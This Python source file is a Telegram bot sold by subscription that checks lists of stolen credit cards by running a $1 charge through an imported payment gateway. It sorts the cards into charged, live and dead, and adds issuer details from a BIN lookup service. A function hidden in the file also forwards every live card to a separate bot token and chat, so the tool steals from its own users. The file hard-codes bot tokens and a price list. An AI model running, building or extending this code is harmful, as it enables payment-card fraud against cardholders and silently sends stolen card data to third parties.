import requests
import telebot
import time
import random
from telebot import TeleBot, types
from telebot.types import Message
from gatet import Tele
from urllib.parse import urlparse
import sys
import time
import requests
import os
import string
import logging
import re
        
token = "8197979766:AAHV_7I1s9WG1pNlfkoqHO1H8Qm1KTqhu7Q" 
bot=telebot.TeleBot(token,parse_mode="HTML")

owners = ["562735329"]
        
# Function to check if the user's ID is in the id.txt file
def is_user_allowed(user_id):
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            allowed_ids = [id.strip() for id in allowed_ids]  # Clean any extra spaces/newlines
            if str(user_id) in allowed_ids:
                return True
    except FileNotFoundError:
        print("id.txt file not found. Please create it with user IDs.")
    return False

def add_user(user_id):
    with open("id.txt", "a") as file:
        file.write(f"{user_id}\n")
        
    try:
        bot.send_message(user_id, "You have been successfully added to the authorized list. You now have access to the bot.")
    except Exception as e:
        print(f"Failed to send DM to {user_id}: {e}")

def remove_user(user_id):
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
        with open("id.txt", "w") as file:
            for line in allowed_ids:
                if line.strip() != str(user_id):
                    file.write(line)
        
        try:
            bot.send_message(user_id, "You have been removed from the authorized list. You no longer have access to the bot.")
        except Exception as e:
            print(f"Failed to send DM to {user_id}: {e}")

    except FileNotFoundError:
        print("id.txt file not found. Cannot remove user.")
        
valid_redeem_codes = []

def generate_redeem_code():
    prefix = "BLACK"
    suffix = "NUGGET"
    main_code = '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
    code = f"{prefix}-{main_code}-{suffix}"
    return code

@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.chat.id) == '562735329':
        new_code = generate_redeem_code()
        valid_redeem_codes.append(new_code)
        bot.reply_to(
            message, 
            f"<b>🎉 New Redeem Code 🎉</b>\n\n"
            f"<code>{new_code}</code>\n\n"
            f"<code>/redeem {new_code}</code>\n"
            f"Use this code to redeem your access!",
            parse_mode="HTML"
        )
    else:
        bot.reply_to(message, "You do not have permission to generate redeem codes.🚫")

LOGS_GROUP_CHAT_ID = -1002732410680

@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    try:
        redeem_code = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "Please provide a valid redeem code. Example: /redeem DRACO-XXXX-XXXX-XXXX-OP")
        return

    if redeem_code in valid_redeem_codes:
        if is_user_allowed(message.chat.id):
            bot.reply_to(message, "You already have access to the bot. Redeeming again is not allowed.")
        else:
            add_user(message.chat.id)
            valid_redeem_codes.remove(redeem_code)
            bot.reply_to(
                message, 
                f"Redeem code {redeem_code} has been successfully redeemed.✅ You now have access to the bot."
            )
            
            # Log the redemption to the logs group
            username = message.from_user.username or "No Username"
            log_message = (
                f"<b>Redeem Code Redeemed</b>\n"
                f"Code: <code>{redeem_code}</code>\n"
                f"By: @{username} (ID: <code>{message.chat.id}</code>)"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message)
    else:
        bot.reply_to(message, "Invalid redeem code. Please check and try again.")

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.from_user.id
    if is_user_allowed(user_id):
        bot.reply_to(message, "You're authorized! Send the file to see the magic 🪄✨")
    else:
        bot.reply_to(message, """
You Are Not Authorized to Use this Bot

⤿ 𝙋𝙧𝙞𝙘𝙚 𝙇𝙞𝙨𝙩 ⚡
⤿ 1 day - 90rs/3$ 
★ 7 days - 180rs/6$ 
★ 1 month - 400rs/18$ 
★ lifetime - 800rs/20$ 

Dm @Sketch_Developer_Pro Tᴏ Bᴜʏ Pʀᴇᴍɪᴜm""")

LOGS_GROUP_CHAT_ID = -1002732410680 # Replace with your logs group chat ID

@bot.message_handler(commands=["add"])
def add(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            user_id_to_add = message.text.split()[1]  # Get the user ID from the command
            add_user(user_id_to_add)
            bot.reply_to(message, f"User {user_id_to_add} added to the authorized list.")
            
            # Send log to logs group
            log_message = (
                f"<b>🚀 User Added</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_add}</code>\n"
                f"🔗 <b>By:</b> @{message.from_user.username or 'No Username'}"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID to add.")
    else:
        bot.reply_to(message, "You are not authorized to perform this action.")

@bot.message_handler(commands=["remove"])
def remove(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            user_id_to_remove = message.text.split()[1]  # Get the user ID from the command
            remove_user(user_id_to_remove)
            bot.reply_to(message, f"User {user_id_to_remove} removed from the authorized list.")
            
            # Send log to logs group
            log_message = (
                f"<b>🗑️ User Removed</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_remove}</code>\n"
                f"🔗 <b>By:</b> @{message.from_user.username or 'No Username'}"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID to remove.")
    else:
        bot.reply_to(message, "You are not authorized to perform this action.")
        
@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = message.chat.id
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>Profile Link</a>"

    # Check user status
    if str(user_id) in owners:
        status = "Owner 👑"
    elif is_user_allowed(user_id):
        status = "Authorised ✅"
    else:
        status = "Not-Authorised ❌"

    # Formatted response
    response = (
        f"🔍 <b>Your Info</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"👤 <b>First Name:</b> {first_name}\n"
        f"👤 <b>Last Name:</b> {last_name}\n"
        f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
        f"📛 <b>Username:</b> @{username}\n"
        f"🔗 <b>Profile Link:</b> {profile_link}\n"
        f"📋 <b>Status:</b> {status}"
    )
    
    bot.reply_to(message, response, parse_mode="HTML")
	
def is_bot_stopped():
    return os.path.exists("stop.stop")


@bot.message_handler(content_types=["document"])
def main(message):
	if not is_user_allowed(message.from_user.id):
		bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @ImposterOnline")
		return
	dd = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
	username = message.from_user.username or "N/A"
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		
	with open("combo.txt", "wb") as w:
		w.write(ee)
		
		start_time = time.time()
		
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			if total > 2001:
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"🚨 Oops! This file contains {total} CCs, which exceeds the 2000 CC limit! ?? Please provide a file with fewer than 500 CCs for smooth processing. 🔥")
				return
				
			for cc in lino:
				current_dir = os.getcwd()
				for filename in os.listdir(current_dir):
					if filename.endswith(".stop"):
						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @ImposterOnline')
						os.remove('stop.stop')
						return
			
				try:
					data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
					
				except:
					pass
				try:
					bank=(data['bank'])
				except:
					bank=('N/A')
				try:
					brand=(data['brand'])
				except:
					brand=('N/A')
				try:
					emj=(data['country_flag'])
				except:
					emj=('N/A')
				try:
					cn=(data['country_name'])
				except:
					cn=('N/A')
				try:
					dicr=(data['level'])
				except:
					dicr=('N/A')
				try:
					typ=(data['type'])
				except:
					typ=('N/A')
				try:
					url=(data['bank']['url'])
				except:
					url=('N/A')
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"• Charged ✅: [ {ch} ] •", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"• CCN ✅ : [ {live} ] •", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"• DEAD ❌ : [ {dd} ] •", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"• TOTAL 👻 : [ {total} ] •", callback_data='x')
				cm6 = types.InlineKeyboardButton(" STOP 🛑 ", callback_data='stop')
				mes.add(cm1, cm2, cm3, cm4, cm5, cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
𝒃𝒚 ➜ @imposteronline''', reply_markup=mes)
				
				try:
					last = str(Tele(cc))
				except Exception as e:
					print(e)
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "Your card was declined."
				
				msg = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: VBV/CVV.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲:  @Sketch_Developer_Pro'''
				print(last)
				if "requires_action" in last:
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
					live += 1
				elif "Your card is not supported." in last:
					live += 1
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
				elif "Your card's security code is incorrect." in last:
					live += 1
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
				elif "succeeded" in last:
					ch += 1
					elapsed_time = time.time() - start_time
					msg1 = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Checked Successfully

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @Sketch_Developer_Pro'''
					send_telegram_notification(msg1)
					bot.reply_to(message, msg1)
				else:
					dd += 1
					
				checked_count = ch + live + dd
				if checked_count % 50 == 0:
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="Taking a 1-minute break... To Prevent Gate from Dying, Please wait ⏳")
					time.sleep(60)
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"Resuming the Process, Sorry for the Inconvience")
					
	except Exception as e:
		print(e)
	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅

Charged CC : {ch}
CCN : {live}
Dead CC : {dd}
Total : {total}

𝗕𝗢𝗧 𝗕𝗬 ➜ @Sketch_Developer_Pro''')
		
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	with open("stop.stop", "w") as file:
		pass
	bot.answer_callback_query(call.id, "Bot will stop processing further tasks.")
	bot.send_message(call.message.chat.id, "The bot has been stopped. No further tasks will be processed.")
	
@bot.message_handler(commands=["show_auth_users", "sau", "see_list"])
def show_auth_users(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            with open("id.txt", "r") as file:
                allowed_ids = file.readlines()
            if not allowed_ids:
                bot.reply_to(message, "No authorized users found.")
                return
            
            # Prepare the message with user IDs and usernames
            user_list = "Authorized Users:\n\n"
            for user_id in allowed_ids:
                user_id = user_id.strip()  # Clean any extra spaces/newlines
                try:
                    user = bot.get_chat(user_id)
                    username = user.username or "No Username"
                    user_list += f"• {username} (ID: {user_id})\n"
                except Exception as e:
                    user_list += f"• User ID: {user_id} (Username not found)\n"
            
            # Send the list to the owner
            bot.reply_to(message, user_list)
        except FileNotFoundError:
            bot.reply_to(message, "id.txt file not found. No authorized users.")
    else:
        bot.reply_to(message, "You are not authorized to view the list of authorized users.")
        
print("DONE ✅")

allowed_group = -1002732410680
last_used = {}

@bot.message_handler(commands=["chk"])
def chk(message):
    try:
        if message.chat.id != allowed_group:
            bot.reply_to(message, "This command can only be used in the designated group. User Must Join the Group @UK25K")
            return
    
        user_id = message.from_user.id  # Get user ID
        current_time = time.time()  # Get the current timestamp

        # Check if the user is in cooldown
        if user_id in last_used and current_time - last_used[user_id] < 25:
            remaining_time = 25 - int(current_time - last_used[user_id])
            bot.reply_to(message, f"Please wait {remaining_time} seconds before using this command again.")
            return

        # Update the last usage timestamp
        last_used[user_id] = current_time
        
        # Extract the card number from the command
        if len(message.text.split()) < 2:
            bot.reply_to(message, "Please provide a valid card number. Usage: /chk <card_number>")
            return
        
        cc = message.text.split('/chk ')[1]
        username = message.from_user.username or "N/A"

        try:
            initial_message = bot.reply_to(message, "Your card is being checked, please wait...")
        except telebot.apihelper.ApiTelegramException:
            initial_message = bot.send_message(message.chat.id, "Your card is being checked, please wait...")

        # Get the response from the `Tele` function
        try:
            last = str(Tele(cc))
        except Exception as e:
            print(f"Error in Tele function: {e}")
            last = "An error occurred."

        # Fetch BIN details
        try:
            response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
            if response.status_code == 200:
                data = response.json()  # Parse JSON
            else:
                print(f"Error: Received status code {response.status_code}")
                data = {}
        except Exception as e:
            print(f"Error fetching BIN data: {e}")
            data = {}

        # Extract details with fallback values
        bank = data.get('bank', 'N/A')
        brand = data.get('brand', 'N/A')
        emj = data.get('country_flag', 'N/A')
        cn = data.get('country_name', 'N/A')
        dicr = data.get('level', 'N/A')
        typ = data.get('type', 'N/A')
        url = data.get('bank', {}).get('url', 'N/A') if isinstance(data.get('bank'), dict) else 'N/A'
        
        if "requires_action" in last:
            message_ra = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: VBV.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬??𝐮??𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫??: {cn} {emj}

𝗧𝗶𝗺??: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @Sketch_Developer_Pro'''
            bot.edit_message_text(message_ra, chat_id=message.chat.id, message_id=initial_message.message_id)
        elif "succeeded" in last:
            msg_sec = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Checked Successfully.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @Sketch_Developer_Pro'''
            bot.edit_message_text(msg_sec, chat_id=message.chat.id, message_id=initial_message.message_id)
        else:
            msg_dec = f'''𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
					
𝗖𝗮𝗿𝗱: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Declined.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @Sketch_Developer_Pro'''
            bot.edit_message_text(msg_dec, chat_id=message.chat.id, message_id=initial_message.message_id)
            
    except Exception as e:
        print(f"Unexpected error: {e}")
        bot.reply_to(message, "An unexpected error occurred. Please try again later.")
    
    
def send_telegram_notification(msg1):
    url = f"https://api.telegram.org/bot8165919062:AAHzFPAocyoM6_DBsH7WRwWD5or0JhMomIU/sendMessage"
    data = {'chat_id': -1002839621564, 'text': msg1, 'parse_mode': 'HTML'}
    requests.post(url, data=data)
    
bot.infinity_polling()
